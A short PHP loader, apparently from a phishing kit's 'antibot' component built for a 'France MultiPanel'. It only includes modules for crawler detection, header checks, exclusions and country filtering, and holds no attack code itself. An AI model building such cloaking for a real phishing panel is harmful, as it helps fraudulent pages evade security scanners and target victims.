<?php
/**
 * Antibot FR - Vssrtje <3
 * PART OF THE ANTIBOT
 * Custom-Made for my France MultiPanel
 */

include_once 'AB/AbstractProvider.php';
include_once 'AB/Exclusions.php';
include_once 'AB/Headers.php';
include_once 'AB/Crawlers.php';
include_once 'AB/CrawlerDetect.php';
include_once 'AB/Country.php';
 ?>
